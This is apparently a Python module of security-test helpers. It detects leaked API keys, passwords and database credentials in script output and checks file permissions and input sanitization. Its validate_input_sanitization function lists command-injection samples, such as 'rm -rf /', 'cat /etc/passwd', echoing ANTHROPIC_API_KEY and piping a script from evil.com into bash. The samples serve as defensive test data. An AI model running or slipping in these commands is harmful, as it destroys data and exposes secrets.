"""Security validation helpers for testing."""

import re
from typing import List, Optional, Tuple
from pathlib import Path


class SecurityViolation:
    """Represents a security violation found in output."""

    def __init__(self, violation_type: str, description: str, evidence: str):
        self.violation_type = violation_type
        self.description = description
        self.evidence = evidence

    def __str__(self):
        return f"{self.violation_type}: {self.description}\nEvidence: {self.evidence}"


def check_for_api_keys_in_output(output: str) -> List[SecurityViolation]:
    """Check if API keys are exposed in output.

    Args:
        output: Script stdout/stderr to check

    Returns:
        List of security violations found
    """
    violations = []

    # Pattern for Anthropic API keys (sk-ant-...)
    api_key_pattern = r'sk-ant-[a-zA-Z0-9_-]{32,}'
    matches = re.finditer(api_key_pattern, output)

    for match in matches:
        violations.append(SecurityViolation(
            violation_type="API_KEY_EXPOSURE",
            description="Anthropic API key found in output",
            evidence=match.group(0)
        ))

    # Pattern for generic API keys
    generic_patterns = [
        r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})["\']?',
        r'["\']?apikey["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})["\']?',
        r'ANTHROPIC_API_KEY=([a-zA-Z0-9_-]{20,})',
    ]

    for pattern in generic_patterns:
        matches = re.finditer(pattern, output, re.IGNORECASE)
        for match in matches:
            # Skip if it's showing the masked version
            if '**' in match.group(0) or '(present)' in match.group(0):
                continue

            violations.append(SecurityViolation(
                violation_type="API_KEY_EXPOSURE",
                description="API key pattern found in output",
                evidence=match.group(0)
            ))

    return violations


def verify_api_key_masking(output: str) -> bool:
    """Verify that API key references are properly masked.

    Args:
        output: Script output to check

    Returns:
        True if API keys are properly masked
    """
    # Look for proper masking patterns
    masking_patterns = [
        r'ANTHROPIC_API_KEY=\*+ \(present\)',
        r'ANTHROPIC_API_KEY:\s*\*+',
        r'API.*key.*\*{5,}',
    ]

    for pattern in masking_patterns:
        if re.search(pattern, output, re.IGNORECASE):
            return True

    # If output mentions API key but doesn't show actual key value
    mentions_key = re.search(r'API[_-]?KEY', output, re.IGNORECASE)
    shows_key = check_for_api_keys_in_output(output)

    return mentions_key and not shows_key


def check_command_injection_sanitization(output: str, malicious_input: str) -> bool:
    """Check if malicious input was sanitized in output.

    Args:
        output: Script output
        malicious_input: The malicious input that was provided

    Returns:
        True if input was sanitized (metacharacters removed)
    """
    # Metacharacters that should be removed
    metacharacters = [';', '|', '&', '$', '`', '<', '>', '(', ')', '{', '}', '[', ']', '!', '*', '?', '~', '#']

    # Check if any metacharacters from malicious input appear in output
    for char in metacharacters:
        if char in malicious_input and char in output:
            # Check context - it might be in error messages which is OK
            if f"sanitize" in output.lower() or "removed" in output.lower():
                continue
            # If it appears in a command or execution context, that's bad
            if re.search(rf'(execute|run|command|eval).*{re.escape(char)}', output, re.IGNORECASE):
                return False

    return True


def check_file_permissions(file_path: Path) -> Tuple[str, bool]:
    """Check file permissions and return warning if too permissive.

    Args:
        file_path: Path to file to check

    Returns:
        Tuple of (permissions as string, is_secure as bool)
    """
    import stat

    if not file_path.exists():
        return "000", False

    st = file_path.stat()
    mode = st.st_mode
    perms = oct(stat.S_IMODE(mode))[-3:]

    # Check if world-readable or group-writable
    world_readable = (mode & stat.S_IROTH) != 0
    group_writable = (mode & stat.S_IWGRP) != 0

    is_secure = not (world_readable or group_writable)

    return perms, is_secure


def check_file_ownership(file_path: Path) -> Tuple[int, bool]:
    """Check if file is owned by current user.

    Args:
        file_path: Path to file to check

    Returns:
        Tuple of (owner_uid, is_owned_by_current_user)
    """
    import os

    if not file_path.exists():
        return -1, False

    st = file_path.stat()
    owner_uid = st.st_uid
    current_uid = os.getuid()

    return owner_uid, owner_uid == current_uid


def find_security_violations_in_output(output: str) -> List[SecurityViolation]:
    """Comprehensive security check for script output.

    Args:
        output: Script stdout/stderr

    Returns:
        List of all security violations found
    """
    violations = []

    # Check for API key exposure
    violations.extend(check_for_api_keys_in_output(output))

    # Check for exposed secrets (generic patterns)
    secret_patterns = [
        (r'password\s*[:=]\s*["\']?([^"\'\s]{8,})["\']?', "PASSWORD_EXPOSURE"),
        (r'secret\s*[:=]\s*["\']?([^"\'\s]{8,})["\']?', "SECRET_EXPOSURE"),
        (r'token\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})["\']?', "TOKEN_EXPOSURE"),
    ]

    for pattern, violation_type in secret_patterns:
        matches = re.finditer(pattern, output, re.IGNORECASE)
        for match in matches:
            # Skip if it's clearly a placeholder or example
            value = match.group(1).lower()
            if any(x in value for x in ['example', 'placeholder', 'your-', 'xxx', '***']):
                continue

            violations.append(SecurityViolation(
                violation_type=violation_type,
                description=f"{violation_type.split('_')[0].title()} potentially exposed",
                evidence=match.group(0)
            ))

    # Check for file paths that might contain sensitive info
    if re.search(r'/\.env|\.env\.local|\.env\.production', output):
        # This is OK if it's just mentioning the file, not showing contents
        if not re.search(r'(cat|content|show|print).*\.env', output, re.IGNORECASE):
            # Just mentioning .env file is fine
            pass

    return violations


def validate_input_sanitization(test_inputs: List[str]) -> List[Tuple[str, bool]]:
    """Generate test cases for input sanitization validation.

    Args:
        test_inputs: List of malicious input strings

    Returns:
        List of (input, should_be_sanitized) tuples
    """
    malicious_inputs = [
        "repo-name; rm -rf /",
        "repo-name | cat /etc/passwd",
        "repo-name && curl evil.com",
        "repo-name $(whoami)",
        "repo-name `cat secrets`",
        "repo-name > /tmp/evil",
        "repo-name < /etc/hosts",
        "repo-name * /tmp/*",
        "repo-name; echo $ANTHROPIC_API_KEY",
        "../../../etc/passwd",
        "$(curl http://evil.com/malware.sh | bash)",
    ]

    return [(inp, True) for inp in malicious_inputs]


def check_error_message_security(error_output: str) -> List[SecurityViolation]:
    """Check if error messages expose sensitive information.

    Args:
        error_output: Error output to analyze

    Returns:
        List of security violations in error messages
    """
    violations = []

    # Check for stack traces with sensitive paths
    if re.search(r'/home/[^/]+/', error_output):
        violations.append(SecurityViolation(
            violation_type="PATH_EXPOSURE",
            description="User home directory path exposed in error",
            evidence="Stack trace contains home directory path"
        ))

    # Check for internal IP addresses
    ip_pattern = r'\b(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}\b'
    if re.search(ip_pattern, error_output):
        violations.append(SecurityViolation(
            violation_type="IP_EXPOSURE",
            description="Internal IP address exposed in error",
            evidence="Private IP address found in output"
        ))

    # Check for database connection strings
    db_patterns = [
        r'postgres://[^@]+:[^@]+@',
        r'mysql://[^@]+:[^@]+@',
        r'mongodb://[^@]+:[^@]+@',
    ]
    for pattern in db_patterns:
        if re.search(pattern, error_output):
            violations.append(SecurityViolation(
                violation_type="DB_CREDENTIAL_EXPOSURE",
                description="Database credentials in connection string",
                evidence="Connection string with credentials found"
            ))

    return violations


def check_for_unsafe_operations(output: str) -> List[SecurityViolation]:
    """Check for potentially unsafe operations in output.

    Args:
        output: Script output

    Returns:
        List of unsafe operation violations
    """
    violations = []

    # Check for execution of eval-like operations
    unsafe_patterns = [
        (r'eval\s+', "EVAL_USAGE"),
        (r'exec\s+["\'].*[;|&]', "EXEC_INJECTION"),
        (r'subprocess.*shell=True', "SHELL_INJECTION"),
    ]

    for pattern, violation_type in unsafe_patterns:
        if re.search(pattern, output):
            violations.append(SecurityViolation(
                violation_type=violation_type,
                description=f"Unsafe operation detected: {violation_type}",
                evidence=f"Pattern matched: {pattern}"
            ))

    return violations
